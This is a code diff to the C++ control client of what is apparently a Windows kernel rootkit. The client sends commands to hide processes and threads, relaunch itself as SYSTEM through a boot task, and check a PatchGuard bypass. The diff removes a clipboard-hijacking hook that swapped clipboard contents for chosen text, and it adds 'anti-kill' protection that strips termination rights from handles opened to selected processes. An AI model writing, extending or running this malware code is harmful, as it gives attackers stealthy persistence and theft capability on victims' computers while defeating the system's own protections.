@@ -25,10 +25,9 @@ enum CmdId {
   CMD_DELAY,
   CMD_PG_STATUS,
   CMD_AUTO_LOAD,
-  CMD_CLIP_ARM,
-  CMD_CLIP_DISARM,
-  CMD_CLIP_STATUS,
-  CMD_CLIP_SET_TEXT,
+  CMD_PROTECT_PROCESS,
+  CMD_UNPROTECT_PROCESS,
+  CMD_LIST_PROTECTED,
   CMD_EXIT = 0
 };
 
@@ -51,10 +50,9 @@ static const ClientCommand kCommands[] = {
     {CMD_DELAY, "Delay", true, "seconds"},
     {CMD_PG_STATUS, "PG Status", false, NULL},
     {CMD_AUTO_LOAD, "Auto Load", false, NULL},
-    {CMD_CLIP_ARM, "Clip Arm", false, NULL},
-    {CMD_CLIP_DISARM, "Clip Disarm", false, NULL},
-    {CMD_CLIP_STATUS, "Clip Status", false, NULL},
-    {CMD_CLIP_SET_TEXT, "Clip Set Text", true, "replacement UTF-16 text"},
+    {CMD_PROTECT_PROCESS, "Protect Process", true, "PID (Enter=target)"},
+    {CMD_UNPROTECT_PROCESS, "Unprotect Process", true, "PID (Enter=target)"},
+    {CMD_LIST_PROTECTED, "List Protected", false, NULL},
 };
 
 static std::string g_targetName;
@@ -219,83 +217,6 @@ static void RunTaskControl(HANDLE h, ULONG op) {
     std::cout << "  Auto load: " << (g_autoEnabled ? "ON" : "OFF") << "\n";
     break;
   }
-}
-
-//
-// Clipboard hook control. The replacement text lives in the client until Arm;
-// the driver caches it via CLIP_SET_TEXT before hooking so the stub has a
-// stable non-paged copy.
-//
-static std::wstring g_clipText;
-
-static void RunClipStatus(HANDLE h) {
-  DRIVER_RESPONSE r = {0};
-  DWORD ret = 0;
-  if (!DeviceIoControl(h, IOCTL_CLIP_STATUS, NULL, 0, &r, sizeof(r), &ret,
-                       NULL)) {
-    std::cout << "  Clip status IOCTL failed (0x" << std::hex << GetLastError()
-              << std::dec << ")\n";
-    return;
-  }
-  std::cout << "  Clipboard hook: " << (r.Data ? "ARMED" : "disarmed") << "\n";
-  std::wcout << L"  Replacement text: \"" << g_clipText << L"\"\n";
-}
-
-static void RunClipSetText(HANDLE h) {
-  DRIVER_RESPONSE r = {0};
-  DWORD ret = 0;
-  const wchar_t* text = g_clipText.c_str();
-  if (g_clipText.empty()) {
-    std::cout << "  No replacement text set yet\n";
-    return;
-  }
-  if (!DeviceIoControl(h, IOCTL_CLIP_SET_TEXT, (void*)text,
-                       (DWORD)((wcslen(text) + 1) * sizeof(wchar_t)), &r,
-                       sizeof(r), &ret, NULL)) {
-    std::cout << "  Clip set-text IOCTL failed (0x" << std::hex << GetLastError()
-              << std::dec << ")\n";
-    return;
-  }
-  if (!NT_SUCCESS(r.Status)) {
-    std::cout << "  Clip set-text failed (status 0x" << std::hex << r.Status
-              << std::dec << ")\n";
-    return;
-  }
-  std::cout << "  Replacement text sent to driver\n";
-}
-
-static void RunClipArm(HANDLE h) {
-  DRIVER_RESPONSE r = {0};
-  DWORD ret = 0;
-  if (!DeviceIoControl(h, IOCTL_CLIP_ARM, NULL, 0, &r, sizeof(r), &ret,
-                       NULL)) {
-    std::cout << "  Clip arm IOCTL failed (0x" << std::hex << GetLastError()
-              << std::dec << ")\n";
-    return;
-  }
-  if (!NT_SUCCESS(r.Status)) {
-    std::cout << "  Clip arm failed (status 0x" << std::hex << r.Status
-              << std::dec << ")\n";
-    return;
-  }
-  std::cout << "  Clipboard hook armed\n";
-}
-
-static void RunClipDisarm(HANDLE h) {
-  DRIVER_RESPONSE r = {0};
-  DWORD ret = 0;
-  if (!DeviceIoControl(h, IOCTL_CLIP_DISARM, NULL, 0, &r, sizeof(r), &ret,
-                       NULL)) {
-    std::cout << "  Clip disarm IOCTL failed (0x" << std::hex << GetLastError()
-              << std::dec << ")\n";
-    return;
-  }
-  if (!NT_SUCCESS(r.Status)) {
-    std::cout << "  Clip disarm failed (status 0x" << std::hex << r.Status
-              << std::dec << ")\n";
-    return;
-  }
-  std::cout << "  Clipboard hook disarmed\n";
 }
 
 // The boot task relaunches us as SYSTEM after every reboot. When there is no
@@ -491,6 +412,46 @@ static void RunProcessList(HANDLE h) {
   }
 }
 
+//
+// Anti-kill: the driver strips terminate/VM/thread access from handles opened
+// to these PIDs. Requires PG bypass - otherwise the driver answers
+// STATUS_DEVICE_CONFIGURATION_ERROR and the command is refused.
+//
+static void RunProtect(HANDLE h, ULONG pid, bool protect) {
+  PROCESS_REQUEST req = {pid};
+  DRIVER_RESPONSE r = {0};
+  DWORD ret = 0;
+  if (!DeviceIoControl(h, protect ? IOCTL_PROTECT_PROCESS
+                                   : IOCTL_UNPROTECT_PROCESS,
+                       &req, sizeof(req), &r, sizeof(r), &ret, NULL)) {
+    std::cout << "  " << (protect ? "Protect" : "Unprotect") << " failed (0x"
+              << std::hex << GetLastError() << std::dec << ")\n";
+    return;
+  }
+  if (!NT_SUCCESS(r.Status)) {
+    std::cout << "  " << (protect ? "Protect" : "Unprotect")
+              << " refused: 0x" << std::hex << r.Status << std::dec;
+    if (r.Status == (NTSTATUS)0xC00400A0)
+      std::cout << " (PatchGuard bypass inactive - feature disabled)";
+    std::cout << "\n";
+    return;
+  }
+  std::cout << "  " << (protect ? "Protected" : "Unprotected") << " " << pid
+            << "\n";
+}
+
+static void RunProtectedList(HANDLE h) {
+  PROTECTED_PROCESS_LIST_RESPONSE resp = {0};
+  DWORD ret = 0;
+  if (DeviceIoControl(h, IOCTL_LIST_PROTECTED_PROCESSES, NULL, 0, &resp,
+                      sizeof(resp), &ret, NULL)) {
+    std::cout << "  Protected: " << resp.Count;
+    for (ULONG i = 0; i < resp.Count; i++)
+      std::cout << " " << resp.ProcessIds[i];
+    std::cout << "\n";
+  }
+}
+
 static void RunThreadList(HANDLE h) {
   THREAD_LIST_RESPONSE resp = {0};
   DWORD ret = 0;
@@ -611,22 +572,6 @@ int wmain(int argc, wchar_t* argv[]) {
         std::cout << "  " << cc->prompt << ": ";
         std::string line;
         std::getline(std::cin, line);
-        if (cmds[i] == CMD_CLIP_SET_TEXT) {
-          if (!line.empty()) {
-            g_clipText.clear();
-            // Re-encode the console input (CP) to UTF-16 for the driver.
-            int wlen =
-                MultiByteToWideChar(CP_ACP, 0, line.c_str(), -1, NULL, 0);
-            if (wlen > 1) {
-              wchar_t* wbuf = new wchar_t[wlen];
-              MultiByteToWideChar(CP_ACP, 0, line.c_str(), -1, wbuf, wlen);
-              g_clipText.assign(wbuf, wlen - 1);
-              delete[] wbuf;
-            }
-          }
-          params[i] = g_clipText.empty() ? 0 : 1;
-          continue;
-        }
         if (!line.empty()) {
           params[i] = strtoul(line.c_str(), NULL, 0);
         } else if (cmds[i] == CMD_HIDE_PROCESS ||
@@ -675,6 +620,15 @@ int wmain(int argc, wchar_t* argv[]) {
       case CMD_LIST_PROCESSES:
         RunProcessList(hDevice);
         break;
+      case CMD_PROTECT_PROCESS:
+        RunProtect(hDevice, params[i], true);
+        break;
+      case CMD_UNPROTECT_PROCESS:
+        RunProtect(hDevice, params[i], false);
+        break;
+      case CMD_LIST_PROTECTED:
+        RunProtectedList(hDevice);
+        break;
       case CMD_HIDE_THREAD: {
         THREAD_REQUEST req = {params[i]};
         std::cout << "  Hide Thread " << params[i] << " -> "
@@ -701,18 +655,6 @@ int wmain(int argc, wchar_t* argv[]) {
         break;
       case CMD_AUTO_LOAD:
         RunTaskControl(hDevice, g_autoEnabled ? TASK_OP_DISABLE : TASK_OP_ENABLE);
-        break;
-      case CMD_CLIP_ARM:
-        RunClipArm(hDevice);
-        break;
-      case CMD_CLIP_DISARM:
-        RunClipDisarm(hDevice);
-        break;
-      case CMD_CLIP_STATUS:
-        RunClipStatus(hDevice);
-        break;
-      case CMD_CLIP_SET_TEXT:
-        RunClipSetText(hDevice);
         break;
       case CMD_DELAY:
         std::cout << "  Sleeping " << params[i] << "s\n";
